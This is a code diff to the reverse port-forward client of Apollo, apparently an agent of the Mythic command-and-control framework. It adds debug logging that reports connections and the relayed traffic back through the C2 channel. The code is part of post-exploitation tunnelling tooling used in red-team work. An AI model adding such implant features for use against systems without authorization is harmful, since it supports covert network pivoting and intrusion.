@@ -10,6 +10,7 @@ using ApolloInterop.Enums.ApolloEnums;
 using ApolloInterop.Structs.MythicStructs;
 using System.Net;
 using ApolloInterop.Utils;
+using System.Text;
 
 namespace Apollo.Management.Rpfwd
 {
@@ -30,16 +31,22 @@ namespace Apollo.Management.Rpfwd
         private TT.Task _sendRequestsTask = null;
         public int ID { get; private set; }
         private IAgent _agent;
+        private Tasking _task;
+        private int _debugLevel;
+        private string _remoteConnectionString;
 
         private ConcurrentQueue<byte[]> _requestQueue = new ConcurrentQueue<byte[]>();
         private ConcurrentQueue<byte[]> _receiveQueue = new ConcurrentQueue<byte[]>();
 
-        public RpfwdClient(IAgent agent, TcpClient client, int serverId, int port)
+        public RpfwdClient(IAgent agent, TcpClient client, int serverId, int port, int debugLevel, Tasking task)
         {
             _agent = agent;
             _port = port;
             ID = serverId;
             _tcpClient = client;
+            _task = task;
+            _debugLevel = debugLevel;
+            _remoteConnectionString = $"{_tcpClient.Client.RemoteEndPoint}";
 
             _sendRequestsAction = (object c) =>
             {
@@ -93,6 +100,10 @@ namespace Apollo.Management.Rpfwd
             args.State = this;
             _sendRequestsTask = new TT.Task(_sendRequestsAction, args.Client);
             _sendRequestsTask.Start();
+            if(_debugLevel > 0)
+            {
+                _agent.GetTaskManager().AddTaskResponseToQueue(_task.CreateTaskResponse($"[Connection {ID}] - New Connection\nClient: {_remoteConnectionString}\n\n", false));
+            }
         }
 
         private void OnDisconnect(object sender, TcpMessageEventArgs args)
@@ -101,6 +112,10 @@ namespace Apollo.Management.Rpfwd
             args.Client.Close();
             _sendRequestsTask.Wait();
             _agent.GetRpfwdManager().Remove(ID);
+            if(_debugLevel > 0)
+            {
+                _agent.GetTaskManager().AddTaskResponseToQueue(_task.CreateTaskResponse($"[Connection {ID}] - Closed Connection\nClient: {_remoteConnectionString}\n\n", false));
+            }
         }
 
         private void OnDataSent(IAsyncResult result)
@@ -135,6 +150,10 @@ namespace Apollo.Management.Rpfwd
                 Exit = false,
                 Port = _port
             });
+            if(_debugLevel >= 1)
+            {
+                _agent.GetTaskManager().AddTaskResponseToQueue(_task.CreateTaskResponse($"[Connection {ID}] - Data ({data.Length} Bytes) From Remote Connection\n{Encoding.UTF8.GetString(data)}\n\n", false));
+            }
         }
 
         
@@ -156,7 +175,11 @@ namespace Apollo.Management.Rpfwd
                 _requestQueue.Enqueue(data);
                 _requestEvent.Set();
                 bRet = true;
-            } 
+            }
+            if(_debugLevel >= 2)
+            {
+                _agent.GetTaskManager().AddTaskResponseToQueue(_task.CreateTaskResponse($"[Connection {ID}] - Data ({data.Length} Bytes) From Mythic Connection\n{Encoding.UTF8.GetString(data)}\n\n", false));
+            }
             return bRet;
         }
     }
